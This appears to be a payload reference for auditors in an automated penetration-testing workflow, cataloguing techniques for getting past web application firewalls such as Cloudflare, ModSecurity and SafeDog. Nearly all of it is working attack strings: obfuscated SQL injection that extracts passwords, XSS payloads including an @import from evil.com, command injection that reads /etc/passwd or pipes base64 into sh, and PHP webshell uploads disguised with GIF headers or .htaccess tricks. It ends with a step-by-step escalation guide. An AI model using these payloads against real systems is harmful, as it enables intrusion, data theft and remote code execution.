# WAF Bypass Strategy Dictionary

General WAF bypass techniques for reference by all Phase 4 Auditors.

---

## General Bypass Techniques

### Encoding Bypass
| Technique | Example | Applicable Scenario |
|------|------|---------|
| URL Encoding | `%27` → `'` | basic WAF |
| Double URL Encoding | `%2527` → `%27` → `'` | WAF that decodes only once |
| Unicode Encoding | `\u0027` → `'` | JS parsing scenarios |
| HTML Entity | `&#39;` → `'` | HTML output scenarios |
| Hex Encoding | `\x27` → `'` | PHP/JS scenarios |
| UTF-8 Overlong Encoding | `%c0%a7` → `/` | legacy systems |

### HTTP Layer Bypass
| Technique | Description |
|------|------|
| HPP (Parameter Pollution) | `?id=1&id=2' OR 1=1--` backend takes the last one |
| Content-Type Confusion | `multipart/form-data` instead of `application/x-www-form-urlencoded` |
| Chunked Transfer | `Transfer-Encoding: chunked` to split Payload |
| HTTP/2 | Some WAFs do not inspect HTTP/2 requests |
| Method Override | `X-HTTP-Method-Override: PUT` |
| Mixed Case | `SeLeCt`, `UnIoN`, `ScRiPt` |
| Oversized Request Body | Pad large amounts of legitimate data before the Payload |

### SQL Injection Bypass
| Technique | Example |
|------|------|
| Inline Comment | `/*!50000SELECT*/` |
| Multi-line Comment | `/**/UNION/**/SELECT/**/` |
| Newline | `--\nSELECT` |
| Scientific Notation | `1e0UNION` |
| Whitespace Alternatives | `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`, `/**/` |
| Equivalent Functions | `MID()` → `SUBSTR()` → `SUBSTRING()` |
| String Concatenation | `CONCAT('SE','LECT')` |

### XSS Bypass
| Technique | Example |
|------|------|
| Mixed Case | `<ScRiPt>` |
| No Spaces | `<svg/onload=alert(1)>` |
| Encoded Event | `<img src=x onerror=&#97;lert(1)>` |
| Template Syntax | `{{constructor.constructor('alert(1)')()}}` |
| SVG | `<svg><animate onbegin=alert(1)>` |
| Data URI | `<a href=data:text/html,<script>alert(1)</script>>` |

### Command Injection Bypass
| Technique | Example |
|------|------|
| IFS | `cat${IFS}/etc/passwd` |
| Tab | `cat%09/etc/passwd` |
| Wildcard | `/bin/ca? /etc/pas*` |
| Backtick | `` `id` `` |
| $() | `$(id)` |
| Newline | `%0aid` |
| Brace Expansion | `{ls,/tmp}` |

---

## WAF Type-Specific Bypass

### Cloudflare
- Exploit Worker routing differences
- Unicode normalization differences
- Chunked + Content-Length confusion
- Origin bypass: find origin IP (DNS history, email headers, certificates)

### ModSecurity (OWASP CRS)
- Paranoia Level 1: basic bypass is sufficient
- Paranoia Level 2: requires encoding + comment combination
- Paranoia Level 3-4: requires advanced obfuscation

### BT Panel WAF
- URL encoding variant bypass
- Nginx path parsing differences
- POST body encoding confusion

### SafeDog
- Chunked transfer bypass
- Parameter name obfuscation
- Multipart boundary confusion

---

## SQLi WAF Bypass

WAF bypass strategies for SQL injection scenarios, covering keyword detection, syntax analysis, semantic analysis, and other multi-layer defenses.

### XML Entity Encoding

| Item | Content |
|------|------|
| **Payload** | `&#x55;NION &#x53;ELECT` → decodes to `UNION SELECT` |
| **Principle** | When WAF performs keyword matching on the raw request body, XML entity-encoded characters are not recognized as SQL keywords; however, the backend XML parser restores the entities, which are ultimately concatenated into SQL |
| **Applicable Scenario** | When the backend receives XML-formatted request bodies (SOAP interfaces, REST XML APIs) and the WAF does not decode XML body entities before inspection |

### Comment Splitting

| Item | Content |
|------|------|
| **Payload** | `UN/**/ION`, `SEL/**/ECT`, `UN/*xxx*/ION+SEL/*yyy*/ECT` |
| **Principle** | MySQL allows inserting `/**/` multi-line comments in the middle of keywords; the database ignores the comments and reassembles the complete keyword; WAF regex matching full words cannot match |
| **Applicable Scenario** | WAFs that perform keyword matching based on regular expressions (e.g., older versions of ModSecurity CRS); effective against MySQL backends, partially supported by PostgreSQL/MSSQL |

### Mixed Case + Double Write

| Item | Content |
|------|------|
| **Payload** | `UNunionION SeLselectECT` — after WAF removes `union`/`select`, the remainder is `UNION SELECT` |
| **Principle** | Some WAFs use a "delete blacklisted keywords" strategy instead of blocking; double-writing ensures that a valid keyword remains after one deletion |
| **Applicable Scenario** | WAFs using replace/strip strategy instead of block strategy; commonly seen in custom WAFs and older versions of SafeDog |

### Hex Encoded Strings

| Item | Content |
|------|------|
| **Payload** | `SELECT * FROM users WHERE name=0x61646d696e` (`0x61646d696e` = `'admin'`) |
| **Principle** | MySQL supports `0x`-prefixed hexadecimal string literals; WAF detection of string values typically targets plaintext wrapped in quotes |
| **Applicable Scenario** | When WAF detects sensitive words in SQL string values (e.g., `admin`, `root`); effective only for MySQL |

### Whitespace Alternatives

| Item | Content |
|------|------|
| **Payload** | `UNION%0aSELECT`, `UNION%0dSELECT`, `UNION%a0SELECT`, `UNION%09SELECT` |
| **Principle** | SQL parsers treat `\n`(0x0a), `\r`(0x0d), `\t`(0x09), and non-breaking space (0xa0) as valid whitespace characters; WAF may only match `0x20` regular space |
| **Applicable Scenario** | When WAF uses `UNION\s+SELECT` regex and `\s` does not cover all whitespace characters |

### MySQL Conditional Comments

| Item | Content |
|------|------|
| **Payload** | `/*!50000UNION*/ /*!50000SELECT*/ 1,2,3` |
| **Principle** | MySQL-specific syntax `/*!NNNNN ... */`: when the version number >= NNNNN, code inside the comment is executed. WAF treats it as a regular comment and ignores it |
| **Applicable Scenario** | Scenarios targeting MySQL >= 5.x; bypasses WAFs that discard `/* */` content entirely |

### Equivalent Functions

| Item | Content |
|------|------|
| **Payload** | `SUBSTR()` → `MID()` / `LEFT()` / `RIGHT()`; `ASCII()` → `ORD()`; `IF()` → `CASE WHEN ... THEN ... END` |
| **Principle** | WAF blacklists typically only cover common function names; using functionally equivalent functions with different names can bypass detection |
| **Applicable Scenario** | When WAF detects based on function name blacklists; equivalent functions differ across databases and MUST be selected based on the backend |

### JSON/Object Syntax

| Item | Content |
|------|------|
| **Payload** | MySQL 8.0+: `SELECT JSON_EXTRACT('{"a":1}','$.a') UNION SELECT password FROM users` |
| **Principle** | Exploits JSON functions and quotes/parentheses within JSON literals to confuse the WAF's syntax analysis tree |
| **Applicable Scenario** | MySQL 8.0+, PostgreSQL JSONB operator scenarios; modern WAFs have incomplete coverage of JSON SQL functions |

### ORDER BY / GROUP BY Injection

| Item | Content |
|------|------|
| **Payload** | `ORDER BY IF(1=1,1,(SELECT 1 FROM information_schema.tables))` |
| **Principle** | WAFs typically focus on injection detection in WHERE clauses, with weaker detection of subqueries in ORDER BY positions |
| **Applicable Scenario** | When the injection point is in a sort parameter; can be used for blind data extraction |

---

## XSS WAF Bypass

WAF bypass strategies for Cross-Site Scripting attack scenarios, covering tag detection, event handler detection, JavaScript function detection, and other layers.

### Unicode Case Folding

| Item | Content |
|------|------|
| **Payload** | `<ſcript>alert(1)</ſcript>`, where `ſ`(U+017F, Latin Small Letter Long S) folds to `S` via `toUpperCase()` |
| **Principle** | When the browser or backend normalizes HTML tag names to uppercase, the Unicode character `ſ` is folded to `S`, turning `ſcript` into `SCRIPT`; WAF's byte-level matching cannot recognize this |
| **Applicable Scenario** | Scenarios where the backend or browser processes input with `strtoupper()` / `toUpperCase()` before outputting to HTML |

### HTML Entity Mixing

| Item | Content |
|------|------|
| **Payload** | `&#60;script&#62;alert(1)&#60;/script&#62;`, or mixed decimal/hexadecimal `&#x3c;script&#62;` |
| **Principle** | When WAF matches `<script>` against raw input, HTML entity-encoded forms will not match; however, browsers decode entities when rendering HTML |
| **Applicable Scenario** | When the output point is in an HTML attribute value or HTML body, and the WAF does not perform entity decoding preprocessing |

### Alternative Event Handlers

| Item | Content |
|------|------|
| **Payload** | `<input onfocus=alert(1) autofocus>`, `<body onpageshow=alert(1)>`, `<marquee onstart=alert(1)>`, `<details ontoggle=alert(1) open>` |
| **Principle** | WAF blacklists typically only cover common events like `onerror`/`onload`/`onclick`; HTML5 introduced numerous new event handlers |
| **Applicable Scenario** | When WAF detects based on event name blacklists; `autofocus`/`open` attributes can trigger events without user interaction |

### No-Parenthesis Function Call

| Item | Content |
|------|------|
| **Payload** | `` alert`1` `` (Tagged Template Literal), `throw onerror=alert,1` |
| **Principle** | JavaScript's Tagged Template Literal syntax allows calling functions without parentheses; WAF detecting `alert(` pattern cannot match |
| **Applicable Scenario** | When WAF detects JavaScript calls by matching the `functionName(` pattern; supported by all modern browsers |

### SVG / MathML Namespace

| Item | Content |
|------|------|
| **Payload** | `<svg><script>alert(1)</script></svg>`, `<math><mtext><script>alert(1)</script></mtext></math>` |
| **Principle** | SVG and MathML have independent parsing rules and namespaces; HTML sanitizers and WAFs may not fully inspect content within these namespaces |
| **Applicable Scenario** | Older versions of sanitizers like DOMPurify, or when WAF does not cover SVG/MathML parsing |

### JavaScript Protocol

| Item | Content |
|------|------|
| **Payload** | `<a href="javascript:alert(1)">`, `<a href="&#106;avascript:alert(1)">`, `<a href="java%0ascript:alert(1)">` |
| **Principle** | Uses the `javascript:` protocol in `href`/`src`/`action` attributes to execute code; obfuscates the protocol name via entity encoding, newlines, etc. |
| **Applicable Scenario** | When the injection point is in an HTML attribute value (especially `href`), and WAF does not perform protocol detection on attribute values |

### DOM Clobbering

| Item | Content |
|------|------|
| **Payload** | `<form id="x"><input name="y" value="javascript:alert(1)">` makes `document.getElementById('x').y.value` controllable |
| **Principle** | Overrides global variables or object properties in the DOM via HTML element `id`/`name` attributes, indirectly affecting JavaScript execution flow |
| **Applicable Scenario** | When the target page's JavaScript reads values from the DOM and concatenates them for execution; WAF cannot detect this indirect attack |

### Mutation XSS (mXSS)

| Item | Content |
|------|------|
| **Payload** | `<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>` — after browser parsing, `&lt;` is restored to `<` |
| **Principle** | The browser's HTML parser changes the DOM structure during serialization-deserialization (mutation), turning originally safe HTML into dangerous content |
| **Applicable Scenario** | Scenarios using `innerHTML` assignment; bypasses server-side sanitizer detection by relying on browser-side parsing differences |

### Expression / CSS Injection

| Item | Content |
|------|------|
| **Payload** | `<div style="background:url(javascript:alert(1))">` (IE), `<style>@import 'http://evil.com/xss.css';</style>` |
| **Principle** | Injects JavaScript via CSS property values (older IE) or loads external malicious stylesheets via CSS @import |
| **Applicable Scenario** | Targets requiring compatibility with older IE; or when the injection point is inside a `<style>` tag or `style` attribute |

---

## Command Injection WAF Bypass

WAF bypass strategies for OS command injection scenarios, covering command name blacklists, special character filtering, argument filtering, and other layers.

### Command Alternatives

| Item | Content |
|------|------|
| **Payload** | `cat` is blocked → `sed -n p /etc/passwd`, `awk '{print}' /etc/passwd`, `tac /etc/passwd`, `nl /etc/passwd`, `head /etc/passwd`, `tail /etc/passwd`, `sort /etc/passwd`, `uniq /etc/passwd`, `rev /etc/passwd \| rev` |
| **Principle** | WAF blacklists typically cover `cat`/`more`/`less` and other common file reading commands, but Linux has many functionally equivalent tools |
| **Applicable Scenario** | When WAF detects based on command name blacklists; applicable to all Linux environments |

### Space Bypass

| Item | Content |
|------|------|
| **Payload** | `cat${IFS}/etc/passwd`, `cat$IFS$9/etc/passwd`, `{cat,/etc/passwd}`, `cat</etc/passwd`, `X=$'\x20';cat${X}/etc/passwd` |
| **Principle** | `$IFS` (Internal Field Separator) defaults to space+Tab+newline; brace expansion and input redirection can also substitute for spaces |
| **Applicable Scenario** | When WAF filters the space character (0x20); effective in all Bash environments |

### Wildcard Bypass

| Item | Content |
|------|------|
| **Payload** | `c?t /e?c/p?sswd`, `/???/??t /???/p??s??`, `cat /etc/pass*`, `cat /etc/passw[a-z]` |
| **Principle** | Shell glob wildcards `?` (single character), `*` (any characters), `[...]` (character set) are expanded by the shell before command execution |
| **Applicable Scenario** | When WAF matches complete command names or full paths; supported by all POSIX shells |

### Variable Concatenation

| Item | Content |
|------|------|
| **Payload** | `a=c;b=at;$a$b /etc/passwd`, `$(echo cat) /etc/passwd`, `` `echo cat` /etc/passwd `` |
| **Principle** | Shell variables are assigned and then concatenated for execution, or command names are dynamically generated via command substitution; WAF cannot resolve these during static analysis |
| **Applicable Scenario** | When WAF performs static string matching; requires the target to support multi-statement execution (semicolons or newlines) |

### Encoded Execution

| Item | Content |
|------|------|
| **Payload** | `echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` (Base64-encoded `cat /etc/passwd`) |
| **Principle** | The complete command is Base64-encoded and then decoded and executed via pipe; WAF cannot identify commands within Base64-encoded content |
| **Applicable Scenario** | When the target system has the `base64` command and allows pipe operations; can bypass virtually all keyword detection |

### Backslash/Quote Insertion

| Item | Content |
|------|------|
| **Payload** | `c\at /etc/passwd`, `c''at /etc/passwd`, `c""at /etc/passwd`, `w'h'o'a'm'i` |
| **Principle** | In Bash, backslash-escaping a normal character produces the same result, and empty quotes have no effect on concatenation; `c\at` = `c''at` = `cat` |
| **Applicable Scenario** | When WAF matches complete command names; effective in all Bash environments, partially supported in sh |

### Hex/Octal Execution

| Item | Content |
|------|------|
| **Payload** | `$'\x63\x61\x74' /etc/passwd` (`\x63\x61\x74` = `cat`), `$'\143\141\164' /etc/passwd` (octal) |
| **Principle** | Bash's `$'...'` syntax supports hexadecimal (`\xNN`) and octal (`\NNN`) escape sequences |
| **Applicable Scenario** | Requires Bash environment (sh does not support `$'...'`); can bypass all plaintext keyword-based detection |

### Time-Based Blind

| Item | Content |
|------|------|
| **Payload** | `; if [ $(whoami \| cut -c1) = r ]; then sleep 5; fi` |
| **Principle** | When command output is blocked by WAF or there is no echo, information is extracted character by character via conditional delays |
| **Applicable Scenario** | Blind command injection scenarios with no output; when WAF blocks response content but does not block requests |

---

## File Upload WAF Bypass

WAF bypass strategies for file upload scenarios, covering file type detection, filename detection, file content detection, and other layers.

### Content-Type Forgery (MIME Type Forgery)

| Item | Content |
|------|------|
| **Payload** | Set `Content-Type: image/jpeg` when uploading a PHP webshell with content `<?php system($_GET['cmd']); ?>` |
| **Principle** | Some WAFs and backends only check the `Content-Type` header in the HTTP request to determine file type without inspecting actual file content |
| **Applicable Scenario** | When the server relies on the client-submitted MIME type for validation; most common in PHP environments |

### Double Extension

| Item | Content |
|------|------|
| **Payload** | `shell.php.jpg`, `shell.php%00.jpg` (Null Byte truncation), `shell.php\x00.jpg` |
| **Principle** | WAF checks the final extension `.jpg` and passes it as an image; but Apache's `AddHandler` or Nginx configuration may execute based on the first recognizable extension `.php`; Null Byte truncation causes C-layer functions to terminate the string at `%00` |
| **Applicable Scenario** | Apache + `AddHandler php-script .php` configuration; PHP < 5.3.4 Null Byte truncation (CVE-2006-7243) |

### Extension Alternatives

| Item | Content |
|------|------|
| **Payload** | `.phtml`, `.php5`, `.php7`, `.phar`, `.phps`, `.pht`, `.pgif`, `.shtml`, `.inc` |
| **Principle** | Apache/Nginx PHP handler configurations may map all these extensions to the PHP parser; WAF blacklists typically only cover `.php` |
| **Applicable Scenario** | When Apache uses `AddType application/x-httpd-php` to map multiple extensions; MUST first probe which extensions can be executed |

### Mixed Case Extension

| Item | Content |
|------|------|
| **Payload** | `shell.PhP`, `shell.pHp`, `shell.PHP`, `shell.Php` |
| **Principle** | Windows file systems are case-insensitive, so `.PhP` is equivalent to `.php`; WAF using case-sensitive matching cannot match |
| **Applicable Scenario** | Windows servers (IIS + PHP, XAMPP, WAMP); ineffective on Linux (case-sensitive file system) |

### Multipart Boundary Manipulation

| Item | Content |
|------|------|
| **Payload** | Add extra parameters in `Content-Disposition`: `filename="shell.jpg"; filename="shell.php"`, or split headers with newlines |
| **Principle** | Parsing differences between WAF and backend for multipart headers — WAF takes the first `filename`, backend takes the last one (or vice versa) |
| **Applicable Scenario** | When WAF and backend multipart parsers have inconsistent implementations; MUST test parsing order for each specific WAF |

### Magic Bytes Prepend (File Header Forgery)

| Item | Content |
|------|------|
| **Payload** | Prepend GIF file header before PHP code: `GIF89a<?php system($_GET['cmd']); ?>`, or add JPEG header `\xFF\xD8\xFF\xE0` |
| **Principle** | WAF determines file type by checking the magic bytes in the file header; prepending a legitimate file header before malicious code can pass detection |
| **Applicable Scenario** | When WAF or backend uses `getimagesize()`/`finfo_file()` or similar functions for file type detection |

### .htaccess Upload (Configuration File Upload)

| Item | Content |
|------|------|
| **Payload** | Upload `.htaccess` with content `AddType application/x-httpd-php .jpg`, then upload `shell.jpg` |
| **Principle** | Apache allows directory-level `.htaccess` to override configuration; after upload, `.jpg` files are parsed by the PHP engine |
| **Applicable Scenario** | When Apache + AllowOverride All is configured; requires the upload directory to allow writing `.htaccess` |

---

## Path Traversal WAF Bypass

WAF bypass strategies for Path Traversal / Directory Traversal scenarios, covering `../` detection, path normalization, and other layers.

### Double URL Encoding

| Item | Content |
|------|------|
| **Payload** | `%252e%252e%252f` → first decode → `%2e%2e%2f` → second decode → `../` |
| **Principle** | WAF performs only one URL decode and sees `%2e%2e%2f` (does not match `../`), but the backend performs two decodes and gets `../` |
| **Applicable Scenario** | Scenarios where the backend performs double URL decoding (e.g., certain Tomcat configurations, custom decoding logic) |

### Brace / Dot Manipulation

| Item | Content |
|------|------|
| **Payload** | `{.}{.}/`, `{..}/`, `.{.}/` |
| **Principle** | Some web servers or frameworks expand content within braces or ignore braces in their path parsers, making `{.}{.}/` equivalent to `../` |
| **Applicable Scenario** | Path parsing differences in specific web servers (e.g., certain Java application servers); MUST test against the target |

### UTF-8 Overlong Encoding

| Item | Content |
|------|------|
| **Payload** | `%c0%ae%c0%ae/` (overlong encoding of `.` is `%c0%ae`), `%c0%af` (overlong encoding of `/`) |
| **Principle** | The UTF-8 standard prohibits overlong encoding, but older parsers may accept it. `.` normally encodes as `0x2e` (1 byte), overlong encodes as `0xc0 0xae` (2 bytes); WAF does not recognize overlong encoding but the backend restores it |
| **Applicable Scenario** | Older Java application servers (e.g., Tomcat before certain versions), IIS 6.0, and other systems with overlong encoding parsing |

### Mixed Slashes

| Item | Content |
|------|------|
| **Payload** | `..\/etc/passwd`, `..\\/etc/passwd`, `../\../etc/passwd` |
| **Principle** | Windows accepts both `/` and `\` as path separators; mixed usage can bypass WAFs that only detect the `../` or `..\` single pattern |
| **Applicable Scenario** | Windows servers (IIS, XAMPP); some Java applications on Windows also accept mixed slashes |

### Path Normalization Bypass

| Item | Content |
|------|------|
| **Payload** | `/etc/passwd` → `//etc////passwd`, `/etc/./passwd`, `/etc/nothing/../passwd` |
| **Principle** | Extra `/`, `./` (current directory), `xxx/../` (enter then return) are equivalent to the original path after path normalization; WAF pattern matching may not handle these |
| **Applicable Scenario** | When WAF performs exact string matching on paths (e.g., blacklisting `/etc/passwd`) rather than matching after normalization |

### Null Byte Injection

| Item | Content |
|------|------|
| **Payload** | `../../etc/passwd%00.jpg`, `../../etc/passwd\0.png` |
| **Principle** | C language strings terminate at `\0`; in PHP < 5.3.4, `%00` truncates the file path, causing the `.jpg` suffix to be discarded |
| **Applicable Scenario** | PHP < 5.3.4, older Perl/CGI; modern PHP has fixed this issue |

### URL Encoding Variants

| Item | Content |
|------|------|
| **Payload** | `%2e%2e%2f` (`../`), `%2e%2e/`, `..%2f`, `%2e%2e%5c` (`..\`) |
| **Principle** | Partially URL-encode characters in `../`; WAF may match the literal `../` but not partially encoded forms |
| **Applicable Scenario** | When WAF does not fully URL-decode input before inspection; the most basic but still effective bypass method |

---

## Usage Guide

1. First use `tools/waf_detector.php` to identify the WAF type
2. Select the corresponding bypass strategy based on the WAF type
3. Use each strategy in conjunction with `tools/payload_encoder.php`
4. Start with the simplest bypass and progressively increase complexity
5. **SQLi Bypass**: first test comment splitting and mixed case, then try encoding-based bypasses
6. **XSS Bypass**: first test alternative event handlers, then try encoding and namespace bypasses
7. **Command Injection Bypass**: first test variable concatenation and quote insertion, then try encoded execution
8. **File Upload Bypass**: first test extension alternatives and mixed case, then try multipart manipulation
9. **Path Traversal Bypass**: first test URL encoding variants, then try double encoding and overlong encoding
